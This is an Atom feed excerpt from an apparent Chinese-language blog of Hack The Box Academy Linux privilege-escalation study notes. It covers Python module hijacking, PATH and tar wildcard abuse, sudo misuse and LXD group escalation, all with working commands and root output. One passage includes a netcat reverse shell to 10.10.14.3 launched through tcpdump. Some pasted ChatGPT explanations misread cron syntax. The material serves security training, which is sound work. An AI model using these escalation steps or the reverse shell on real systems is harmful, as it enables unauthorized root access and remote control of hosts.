id="Hijacked-Module-Contents-psutil-py"><a href="#Hijacked-Module-Contents-psutil-py" class="headerlink" title="Hijacked Module Contents - psutil.py"></a>Hijacked Module Contents - psutil.py</h4><pre><code class="python">#!/usr/bin/env python3import osdef virtual_memory():    os.system(&#39;id&#39;)</code></pre><p>为了达到这一点，我们需要创建一个名为psutil.py的文件，该文件包含前面提到的目录中列出的内容。非常重要的是，我们要确保我们创建的模块与导入具有相同的名称，并且具有与我们打算劫持的函数相同的函数，并向其传递正确数量的参数。这一点至关重要，因为如果这两种情况都不成立，我们将无法进行这次攻击。在创建了包含上一个劫持脚本示例的文件之后，我们已经成功地为利用该系统做好了准备。 让我们再次像前面的例子一样使用sudo运行mem_status.py脚本。</p><pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 mem_stats.pyuid=0(root) gid=0(root) groups=0(root)Traceback (most recent call last):  File &quot;mem_stats.py&quot;, line 4, in &lt;module&gt;    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().totalAttributeError: &#39;NoneType&#39; object has no attribute &#39;available&#39; </code></pre><h2 id="PYTHONPATH-Environment-Variable"><a href="#PYTHONPATH-Environment-Variable" class="headerlink" title="PYTHONPATH Environment Variable"></a>PYTHONPATH Environment Variable</h2><p>在上一节中，我们谈到了术语PYTHONPATH，但是，并没有完全解释它的使用和关于Python功能的重要性。PYTHONPATH是一个环境变量，指示Python可以搜索要导入的模块的目录。这一点很重要，因为如果允许用户在运行python二进制文件时操作和设置此变量，那么在导入模块时，他们可以有效地将python的搜索功能重定向到用户定义的位置。我们可以通过检查我们的sudo权限来查看我们是否有权限为python二进制文件设置环境变量：</p><h4 id="Checking-sudo-permissions"><a href="#Checking-sudo-permissions" class="headerlink" title="Checking sudo permissions"></a>Checking sudo permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo -l Matching Defaults entries for htb-student on ACADEMY-LPENIX:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser htb-student may run the following commands on ACADEMY-LPENIX:    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3</code></pre><p>正如我们从示例中看到的那样，我们可以在sudo的可信权限下运行&#x2F;usr&#x2F;bin&#x2F;python3，因此可以通过设置SETENV:标志来设置环境变量，以便与该二进制文件一起使用。值得注意的是，由于sudo的可信性质，在调用二进制文件之前定义的任何环境变量都不受任何关于能够在系统上设置环境变量的限制。这意味着使用&#x2F;usr&#x2F;bin&#x2F;python3二进制文件，我们可以在运行程序的上下文中有效地设置任何环境变量。现在让我们使用上一节中的psutil.py脚本来尝试这样做。</p><pre><code class="shell-session">htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.pyuid=0(root) gid=0(root) groups=0(root)...SNIP...</code></pre><p>在本例中，我们将上一个python脚本从&#x2F;usr&#x2F;lib&#x2F;python3.8目录移动到&#x2F;tmp。从这里开始，我们再次调用&#x2F;usr&#x2F;bin&#x2F;python3来运行mem_stats.py，但是，我们指定PYTHONPATH变量包含&#x2F;tmp目录，以便它强制Python搜索该目录以查找要导入的psutil模块。正如我们所看到的，我们再次成功地在root上下文下运行了我们的脚本。</p><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><blockquote><p>我们已签约对INLANEFREIGHT组织的一个面向公众的网络服务器进行安全强化评估。 客户端为我们提供了一个低特权用户来评估服务器的安全性。通过SSH连接，并使用本模块中学到的技能开始查找可能会提升权限的错误配置和其他缺陷。 一旦进入主机，我们必须在主机上找到五个标志，这些标志可以在不同的权限级别访问。将权限从htb学生用户一直提升到根用户，并提交所有五个标志来完成本模块。 注意：如果您想让场景更具挑战性，有一种方法可以在盒子上获得shell，而不是使用SSH凭据。这是可选的，不会奖励更多的分数或计入完成。</p></blockquote><p>根据提示所说，目测他应该有一个网站，简单扫描了一下，它使用了wordpress5.5.1，搜索了一下有一些漏洞，然后在8080端口有一个webadmin链接，需要登陆，这里简单探索了一下，先不深究。</p><p>这里通过信息搜集发现在系统内核版本和sudo版本都存在漏洞，但是主机不允许跟github通信，通过其他方法把exp脚本传过去，我这里使用的是本机搭建一个服务器，然后：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181333205.png" alt="image-20230718133304072"></p><p>很奇怪，第一个flag找不到？这里先用新学到的方法一次性读取一下找到的flag：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181335994.png" alt="image-20230718133545934"></p><p>查看了一下他给的提示，让彻底枚举整个目录，猜想可能是隐藏文件，果然：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181342618.png" alt="image-20230718134212561"></p><p>这里根据他给出的路径顺序其实也暗示了我们平时可能拿到敏感信息的地方：</p><p>当前用户目录下的隐藏文件，就拿这道题来说还是能从用户目录下读到不少敏感信息</p><pre><code>htb-student@nix03:~$ ls -altotal 36drwxr-xr-x 4 htb-student htb-student 4096 Jul 18 05:08 .drwxr-xr-x 5 root        root        4096 Sep  6  2020 ..-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrcdrwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cachedrwxr-xr-x 2 root        root        4096 Sep  6  2020 .config-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile-rw------- 1 htb-student htb-student  676 Jul 18 05:08 .viminfo</code></pre><p>然后就是&#x2F;home路径下其他的用户文件、&#x2F;log系统日志文件、&#x2F;…&#x2F;tomcat9&#x2F;系统启动的服务器目录 、&#x2F;root即管理员目录等</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Containers&quot;&gt;&lt;a href=&quot;#Containers&quot; class=&quot;headerlink&quot; title=&quot;Containers&quot;&gt;&lt;/a&gt;Containers&lt;/h1&gt;&lt;p&gt;容器在操作系统级别操作，虚拟机在硬件级别操作。因此，容器共享一个操作系统，并将应用程序进程与系统的其他部分隔离开来，而经典的虚拟化允许多个操作系统在单个系统上同时运行。 隔离和虚拟化至关重要，因为它们有助于尽可能高效地管理资源和安全方面。例如，它们有助于监测系统中的错误，这些错误通常与新开发的应用程序无关。另一个例子是隔离通常需要root权限的进程。此类应用程序可以是web应用程序或API，必须与主机系统隔离，以防止升级到数据库。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Linux-Privilege-Escalation2</title>
    <link href="https://taninluv.github.io/2023/07/16/Linux-Privilege-Escalation2/"/>
    <id>https://taninluv.github.io/2023/07/16/Linux-Privilege-Escalation2/</id>
    <published>2023-07-16T01:42:18.000Z</published>
    <updated>2023-07-18T11:28:13.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Path-Abuse"><a href="#Path-Abuse" class="headerlink" title="Path Abuse"></a>Path Abuse</h1><p>如果我们可以修改用户的路径，我们可以用恶意脚本（如反向shell）替换常见的二进制文件（如ls）。如果我们加上。通过发出命令path&#x3D;.：$PATH，然后导出PATH，我们将能够通过键入文件名来运行位于当前工作目录中的二进制文件（即，仅键入ls将调用当前工作目录下名为ls的恶意脚本，而不是位于&#x2F;bin&#x2F;ls的二进制文件）。</p><span id="more"></span><pre><code class="shell-session">htb_student@NIX02:~$ PATH=.:$&#123;PATH&#125;htb_student@NIX02:~$ export PATHhtb_student@NIX02:~$ echo $PATH.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</code></pre><p>在本例中，我们修改路径，以便在键入ls命令时运行一个简单的echo命令。</p><pre><code class="shell-session">htb_student@NIX02:~$ touch lshtb_student@NIX02:~$ echo &#39;echo &quot;PATH ABUSE!!&quot;&#39; &gt; lshtb_student@NIX02:~$ chmod +x ls</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ lsPATH ABUSE!!</code></pre><h1 id="Wildcard-Abuse"><a href="#Wildcard-Abuse" class="headerlink" title="Wildcard Abuse"></a>Wildcard Abuse</h1><p>滥用通配符</p><p>通配符可以用作其他字符的替换，并在执行其他操作之前由shell进行解释。通配符的示例包括：</p><table><thead><tr><th><strong>字符</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td><code>*</code></td><td>可以匹配文件名中任意数量的字符的星号。</td></tr><tr><td><code>?</code></td><td>匹配单个字符。</td></tr><tr><td><code>[ ]</code></td><td>方括号将字符括起来，并且可以匹配定义位置的任何一个字符。</td></tr><tr><td><code>~</code></td><td>开头的波浪号扩展为用户主目录的名称，也可以附加另一个用户名以引用该用户的主目录。</td></tr><tr><td><code>-</code></td><td>括号内的连字符表示字符范围。</td></tr></tbody></table><p>tar命令是一个如何滥用通配符进行权限提升的示例，它是一个用于创建&#x2F;提取归档的通用程序。如果我们查看tar命令的手册页，我们会看到以下内容：</p><pre><code class="shell-session">htb_student@NIX02:~$ man tar&lt;SNIP&gt;Informative output       --checkpoint[=N]              Display progress messages every Nth record (default 10).       --checkpoint-action=ACTION              Run ACTION on each checkpoint.</code></pre><p>–checkpoint操作选项允许在到达检查点时执行EXEC操作（即，在执行tar命令后运行任意操作系统命令。）通过使用这些名称创建文件，当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh将作为命令行选项传递给tar。让我们在实践中看到这一点。 考虑下面的cron作业，它被设置为备份&#x2F;root目录的内容，并在&#x2F;tmp中创建一个压缩的归档文件。cron作业被设置为每分钟运行一次，因此它是特权提升的一个很好的候选者。</p><blockquote><p>&#x3D;&#x3D;当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh&#x3D;&#x3D;这句话相当于手动设置ACTION为sh root.sh</p></blockquote><pre><code class="shell-session">##mh dom mon dow command*/01 * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code></pre><p>这里补充一些chatgpt：</p><blockquote><p>这个命令看起来像是一个 cron 表达式，用于设置定时任务。在 cron 表达式中，有 5 个字段，它们分别表示：</p><ol><li><code>m</code>：分钟（0-59）</li><li><code>h</code>：小时（0-23）</li><li><code>dom</code>：月份中的某一天（1-31）</li><li><code>mon</code>：月份（1-12）</li><li><code>dow</code>：星期中的某一天（0-7，其中 0 和 7 都表示星期日）</li></ol><p>每个字段可以是一个具体的数字，也可以是一个范围或者一个列表。例如，<code>*</code> 表示匹配所有的可能值。你提供的表达式缺少了具体的数字或通配符，所以不能确定这个表达式的具体含义。</p><p>在一个完整的 cron 表达式中，你需要为每个字段提供具体的值或通配符，以指定定时任务的执行时间。例如，以下是一个有效的 cron 表达式：</p><pre><code>* * * * * command</code></pre><p>这个表达式表示每分钟都执行 <code>command</code> 命令。在实际使用 cron 表达式时，请确保为每个字段提供适当的值，以确保定时任务能够按照你的预期进行执行。</p></blockquote><blockquote><p>这个 cron 表达式表示一个定时任务，它将在每小时的第一分钟（即每小时的 0 分钟）执行一次。该任务的具体命令如下：</p><pre><code class="bash">cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code></pre><p>这个命令执行了两个操作：</p><ol><li><code>cd /root</code>：切换当前工作目录到 <code>/root</code> 目录。</li><li><code>tar -zcf /tmp/backup.tar.gz *</code>：将当前目录中的所有文件和子目录（除了隐藏文件）打包为一个名为 <code>backup.tar.gz</code> 的压缩文件，并保存到 <code>/tmp</code> 目录下。</li></ol><p>在定时任务中使用 <code>*/01</code> 作为分钟字段的值，表示该任务将每小时的每分钟都执行一次。由于 <code>*/01</code> 和 <code>*</code> 效果是相同的，因此也可以简写为 <code>*</code>，这样定时任务的表达式将是 <code>* * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code>。</p><p>总结：这个定时任务将在每小时的第一分钟执行，并将 <code>/root</code> 目录中的所有文件和子目录打包为一个压缩文件保存到 <code>/tmp</code> 目录中。</p></blockquote><p>考虑到以上内容，我们可以利用cron作业中的通配符将必要的命令写成文件名。当cron作业运行时，这些文件名将被解释为参数，并执行我们指定的任何命令。</p><pre><code class="shell-session">htb_student@NIX02:~$ echo &#39;echo &quot;cliff.moore ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; root.shhtb_student@NIX02:~$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh root.sh&quot;htb_student@NIX02:~$ echo &quot;&quot; &gt; --checkpoint=1</code></pre><blockquote><p>当解析 <code>cliff.moore ALL=(root) NOPASSWD: ALL</code> 这段代码时，我们可以将其分解为以下几个部分：</p><ol><li><p><code>cliff.moore</code>: 这是允许执行 <code>sudo</code> 命令的用户名。换句话说，用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令获得特权执行权限。</p></li><li><p><code>ALL</code>: 这是指用户 <code>cliff.moore</code> 可以在系统中执行任意的命令，即可以在任何位置和任何情况下使用 <code>sudo</code> 命令。</p></li><li><p><code>(root)</code>: 这表示用户 <code>cliff.moore</code> 可以使用 <code>sudo</code> 命令以 root 用户的身份执行命令。在括号中指定了用户 <code>cliff.moore</code> 可以使用的目标用户，这里是 <code>root</code>，即以 root 用户身份执行命令。</p></li><li><p><code>NOPASSWD: ALL</code>: 这表示用户 <code>cliff.moore</code> 在执行 <code>sudo</code> 命令时不需要输入密码，即可以无需验证密码地以 root 用户的身份执行任意命令。</p></li></ol><p>综上所述，该代码的含义是：用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令以 root 用户的身份在系统中执行任意命令，并且在执行 <code>sudo</code> 命令时无需输入密码。这样，用户 <code>cliff.moore</code> 就可以在需要管理员权限的任务上更加便捷地工作，但同时也增加了系统的安全风险。因此，需要谨慎对待对 <code>sudoers</code> 文件的修改，确保只授予必要的权限并只给予可信用户访问权限。</p></blockquote><p>我们可以检查并查看是否创建了必要的文件。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -latotal 56drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.shdrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unixdrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix-rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh</code></pre><p>一旦cron作业再次运行，我们就可以检查新添加的sudo权限和直接root的sudo。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo -lMatching Defaults entries for cliff.moore on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser cliff.moore may run the following commands on NIX02:    (root) NOPASSWD: ALL</code></pre><h1 id="Escaping-Restricted-Shells"><a href="#Escaping-Restricted-Shells" class="headerlink" title="Escaping Restricted Shells"></a>Escaping Restricted Shells</h1><p>可以使用几种方法来从受限制的shell中逃脱。其中一些方法涉及利用外壳本身的漏洞，而另一些方法则涉及使用创造性技术来绕过外壳施加的限制。以下是一些可以用于从受限shell中转义的方法示例。</p><h4 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h4><p>想象我们在一个受限的shell中，它允许我们通过将命令作为参数传递给ls命令来执行命令。不幸的是，shell只允许我们使用一组特定的参数来执行ls命令，例如ls-l或ls-a，但它不允许我们执行任何其他命令。在这种情况下，我们可以通过向ls命令的参数中注入额外的命令，使用命令注入来从shell中转义。 例如，我们可以使用以下命令将pwd命令注入ls命令的参数中：</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l `pwd` </code></pre><blockquote><p><code>pwd</code>：这个部分使用反引号 &#96;&#96;&#96; 将 <code>pwd</code> 命令包围起来。这被称为命令替换（Command Substitution）。它的作用是将 <code>pwd</code> 命令的输出结果（即当前工作目录的路径）插入到整个命令中。</p><p>$ ls -l `pwd`<br>total 32<br>-rw-r–r– 1 user user 1024 Jul 16 10:30 file1.txt<br>-rw-r–r– 1 user user 2048 Jul 16 10:31 file2.txt<br>drwxr-xr-x 2 user user 4096 Jul 16 10:32 directory1<br>drwxr-xr-x 2 user user 4096 Jul 16 10:33 directory2<br>…</p></blockquote><h4 id="Command-Substitution"><a href="#Command-Substitution" class="headerlink" title="Command Substitution"></a>Command Substitution</h4><p>另一种从受限shell中转义的方法是使用命令替换。这涉及到使用shell的命令替换语法来执行命令。例如，假设shell允许用户通过将命令封装在backticks（&#96;）中来执行命令。在这种情况下，可以通过在不受shell限制的backtick替换中执行命令来从shell中转义。</p><h4 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h4><p>为了从受限制的shell中转义以使用环境变量，需要修改或创建shell用于执行不受shell限制的命令的环境变量。例如，如果shell使用环境变量来指定执行命令的目录，则可以通过修改环境变量的值以指定不同的目录来从shell中转义。</p><h4 id="Shell-Functions"><a href="#Shell-Functions" class="headerlink" title="Shell Functions"></a>Shell Functions</h4><p>在某些情况下，可以通过使用shell函数来逃离受限制的shell。为此，我们可以定义和调用执行不受shell限制的命令的shell函数。比方说，shell允许用户定义和调用shell函数，可以通过定义执行命令的shell函数来逃离shell。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.</p><h1 id="Special-Permissions"><a href="#Special-Permissions" class="headerlink" title="Special Permissions"></a>Special Permissions</h1><p>执行时设置用户ID（setuid）权限可以允许用户使用另一个用户的权限（通常具有提升的权限）执行程序或脚本。setuid位显示为s。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></pre><blockquote><p>在 Linux 文件系统中，文件和目录的权限由 10 个字符表示，其中第一个字符表示文件类型，后面的 9 个字符表示文件的访问权限。在这 9 个字符中，前三个字符表示文件所有者（Owner）的权限，接着的三个字符表示文件所属组（Group）的权限，最后三个字符表示其他用户的权限。</p><p>数字 <code>4000</code> 表示 <code>setuid</code> 权限位。它是 <code>s</code> 权限位的数值表示。<code>s</code> 权限位可以设置在文件的所有者的执行权限位上，以允许文件在执行时获取所有者的权限。</p><p>在权限字符串中，<code>4000</code> 的表示如下：</p><pre><code>-rwsr-xr-x</code></pre><p>其中：</p><ul><li><code>-</code> 表示文件类型为普通文件。</li><li><code>rws</code> 表示设置了 <code>setuid</code> 权限位。实际上，这里的 <code>s</code> 是 <code>x</code> 权限位（执行权限）的替代符，表示设置了 <code>setuid</code>。</li><li><code>r-x</code> 表示文件所有者具有读取和执行权限。</li><li><code>r-x</code> 表示文件所属组和其他用户具有读取和执行权限。</li></ul><p>总结：<code>-rwsr-xr-x</code> 权限位表示此文件是一个普通文件，具有 <code>setuid</code> 权限，所有者拥有读取、写入和执行权限，而组成员和其他用户拥有读取和执行权限。</p><p>在系统中，<code>setuid</code> 权限通常用于一些需要特权身份运行的程序，如 <code>/usr/bin/passwd</code>，以便在更改用户密码时获得必要的权限。但是，<code>setuid</code> 权限需要谨慎使用，因为错误地设置它可能导致系统安全风险。</p></blockquote><p>可能会对设置了SETUID位的程序进行反向工程，识别漏洞，并利用此漏洞提升我们的权限。许多程序都有可以用来执行命令的附加功能，如果在这些程序上设置了setuid位，这些功能就可以用于我们的目的。 Set Group ID（setgid）权限是另一种特殊权限，它允许我们运行二进制文件，就好像我们是创建二进制文件的组的一部分一样。可以使用以下命令枚举这些文件：find&#x2F;-uid 0-perm-6000-type f 2&gt;&#x2F;dev&#x2F;null。可以以与setuid二进制文件相同的方式利用这些文件来提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</code></pre><h2 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h2><p><a href="https://gtfobins.github.io/">GTFOBins</a>项目是一个精心策划的二进制文件和脚本列表，攻击者可以使用这些文件和脚本来绕过安全限制。每个页面都详细介绍了程序的功能，这些功能可用于突破受限制的shell、提升权限、生成反向shell连接和传输文件。例如，apt-get可以用于突破受限环境，并通过添加预调用命令生成shell：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh# iduid=0(root) gid=0(root) groups=0(root)</code></pre><h1 id="Sudo-Rights-Abuse"><a href="#Sudo-Rights-Abuse" class="headerlink" title="Sudo Rights Abuse"></a>Sudo Rights Abuse</h1><p>Sudo权限可以授予一个帐户，允许该帐户在根（或另一个帐户）的上下文中运行某些命令，而不必更改用户或授予过多的权限。当发出sudo命令时，系统将检查发出命令的用户是否具有&#x2F;etc&#x2F;sudoers中配置的适当权限。当登录系统时，我们应该始终通过键入sudo-l来检查当前用户是否具有任何sudo权限。有时，我们需要知道用户的密码才能列出他们的sudo权限，但任何带有NOPASSWD选项的权限条目都可以在不输入密码的情况下看到。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo -lMatching Defaults entries for sysadm on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser sysadm may run the following commands on NIX02:    (root) NOPASSWD: /usr/sbin/tcpdump</code></pre><p>这很容易被误解。例如，用户可以在不需要密码的情况下被授予根级别权限。或者，允许的命令行可能指定得太松散，使我们能够以意外的方式运行程序，从而导致权限提升。例如，如果编辑sudoers文件以授予用户根据sudoers中的以下条目运行命令（如tcpdump）的权限：（ALL）NOPASSWD:&#x2F;usr&#x2F;sbin&#x2F;tcpdump，则攻击者可以利用此权限来利用postrotate命令选项。</p><pre><code class="shell-session">htb_student@NIX02:~$ man tcpdump&lt;SNIP&gt; -z postrorate-command              Used in conjunction with the -C or -G options, this will make `tcpdump` run &quot; postrotate-command file &quot; where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.</code></pre><p>通过指定-z标志，攻击者可以使用tcpdump执行shell脚本、获得作为根用户的反向shell或运行其他特权命令。例如，攻击者可以创建包含反向shell的shell脚本.test，并按如下方式执行：</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></pre><blockquote><p>这个命令使用 <code>tcpdump</code> 工具进行网络数据包捕获，并利用 <code>-z</code> 选项指定了一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。以下是命令的各个选项的解释：</p><ul><li><code>sudo</code>: 使用超级用户权限运行 <code>tcpdump</code>，因为只有特权用户（如 <code>root</code>）才能进行网络数据包捕获。</li><li><code>tcpdump</code>: 命令本身，用于捕获和显示网络数据包。</li><li><code>-ln</code>: 以数字格式显示输出，并禁用 DNS 反向解析。</li><li><code>-i eth0</code>: 指定网络接口为 <code>eth0</code>，即指定从 <code>eth0</code> 网络接口捕获数据包。</li><li><code>-w /dev/null</code>: 将捕获的数据包写入 <code>/dev/null</code>，即丢弃数据包而不实际保存。</li><li><code>-W 1</code>: 指定数据包文件的最大数量为 1，即每次最多只生成一个数据包文件。</li><li><code>-G 1</code>: 指定生成新数据包文件的时间间隔为 1 秒。</li><li><code>-z /tmp/.test</code>: 指定一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。在每个新文件创建时，将运行该脚本，对新文件进行处理。</li><li><code>-Z root</code>: 在 <code>tcpdump</code> 运行时设置当前用户为 <code>root</code>，这通常用于确保在捕获数据包时具有足够的权限。</li></ul></blockquote><p>让我们试试这个。首先，制作一个文件，用postrotate命令执行，添加一个简单的反向shell一行。</p><pre><code class="shell-session">htb_student@NIX02:~$ cat /tmp/.testrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 443 &gt;/tmp/f</code></pre><blockquote><p>这个命令使用了一系列 Linux 命令，下面逐步解释：</p><ol><li><code>rm /tmp/f</code>：删除 <code>/tmp/f</code> 文件，确保之前不存在同名的命名管道（named pipe）。</li><li><code>mkfifo /tmp/f</code>：创建一个命名管道 <code>/tmp/f</code>。命名管道是一种特殊类型的文件，可以用于进程间通信，它允许一个进程将数据写入管道，而另一个进程可以从管道读取数据。</li><li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1</code>：将 <code>/tmp/f</code> 命名管道的输出通过管道（<code>|</code>）传递给 <code>/bin/sh</code>，并使用 <code>-i</code> 选项开启一个交互式 Shell。<code>2&gt;&amp;1</code> 将标准错误输出重定向到标准输出，确保错误信息也被传递到 <code>/bin/sh</code>。</li><li><code>nc 10.10.14.3 443 &gt; /tmp/f</code>：将 <code>/bin/sh</code> 的输出通过网络连接传递给 IP 地址为 <code>10.10.14.3</code>，端口号为 <code>443</code> 的远程主机。同时，将从网络连接接收到的数据写入 <code>/tmp/f</code> 命名管道。</li></ol></blockquote><h1 id="Privileged-Groups"><a href="#Privileged-Groups" class="headerlink" title="Privileged Groups"></a>Privileged Groups</h1><h2 id="LXC-x2F-LXD"><a href="#LXC-x2F-LXD" class="headerlink" title="LXC &#x2F; LXD"></a>LXC &#x2F; LXD</h2><p>LXD类似于Docker，是Ubuntu的容器管理器。安装后，所有用户都会添加到LXD组中。通过创建一个LXD容器，使其具有特权，然后访问&#x2F;mnt&#x2F;root上的主机文件系统，可以使用该组的成员身份来提升权限。让我们确认组成员身份，并使用这些权限升级为root用户。</p><pre><code class="shell-session">devops@NIX02:~$ iduid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)</code></pre><p>Unzip the Alpine image.</p><pre><code class="shell-session">devops@NIX02:~$ unzip alpine.zip Archive:  alpine.zipextracting: 64-bit Alpine/alpine.tar.gz  inflating: 64-bit Alpine/alpine.tar.gz.root  cd 64-bit\ Alpine/</code></pre><p>启动LXD初始化过程。为每个提示选择默认值。有关每一步的更多信息，请参阅本文<a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04">post</a> 。</p><pre><code class="shell-session">devops@NIX02:~$ lxd init</code></pre><p>Import the local image.</p><pre><code class="shell-session">devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></pre><p>启动一个安全性设置为true的特权容器，以在没有UID映射的情况下运行容器，使容器中的根用户与主机上的根用户相同。</p><pre><code class="shell-session">devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true</code></pre><p>装载主机文件系统。</p><pre><code class="shell-session">devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=trueDevice mydev added to r00t</code></pre><p>最后，在容器实例中生成一个shell。我们现在可以以root用户身份浏览已装载的主机文件系统。例如，要访问主机上根目录的内容，请键入cd&#x2F;mnt&#x2F;root&#x2F;root。从这里，我们可以读取&#x2F;etc&#x2F;shadow等敏感文件，并获得密码哈希或访问SSH密钥，以便以root身份连接到主机系统，等等。</p><pre><code class="shell-session">devops@NIX02:~$ lxc start r00tdevops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh~ # iduid=0(root) gid=0(root)~ # </code></pre><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>将用户放在docker组中本质上相当于在不需要密码的情况下对文件系统进行根级访问。docker组的成员可以生成新的docker容器。一个例子是运行命令docker run-v&#x2F;root:&#x2F;mnt-it ubuntu。此命令创建一个新的Docker实例，其中主机文件系统上的&#x2F;root目录作为卷安装。一旦容器启动，我们就可以浏览到已安装的目录，并为根用户检索或添加SSH密钥。这可以对其他目录（如&#x2F;etc&#x2F;shadow文件）执行，这些目录可用于检索&#x2F;etc&#x2F;shadow文件的内容以进行脱机密码破解或添加特权用户。</p><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>磁盘组中的用户可以完全访问&#x2F;dev&#x2F;sda1中包含的任何设备，例如&#x2F;dev&#x2F;sda1，它通常是操作系统使用的主要设备。具有这些权限的攻击者可以使用debugfs以根级别权限访问整个文件系统。与Docker组示例一样，这可以用于检索SSH密钥、凭据或添加用户。</p><h2 id="ADM"><a href="#ADM" class="headerlink" title="ADM"></a>ADM</h2><p>adm组的成员可以读取&#x2F;var&#x2F;log中存储的所有日志。这不会直接授予root访问权限，但可以用来收集存储在日志文件中的敏感数据，或枚举用户操作和运行cron作业。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p> <strong>Use the privileged group rights of the secaudit user to locate a flag.</strong></p><h1 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h1><p>设置功能包括使用适当的工具和命令为可执行文件或程序分配特定的功能。例如，在Ubuntu中，我们可以使用setcap命令为特定的可执行文件设置功能。此命令允许我们指定要设置的功能和要分配的值。 例如，我们可以使用以下命令为可执行文件设置cap_net_bind_service功能：</p><h4 id="Set-Capability"><a href="#Set-Capability" class="headerlink" title="Set Capability"></a>Set Capability</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo setcap cap_net_bind_service=+ep 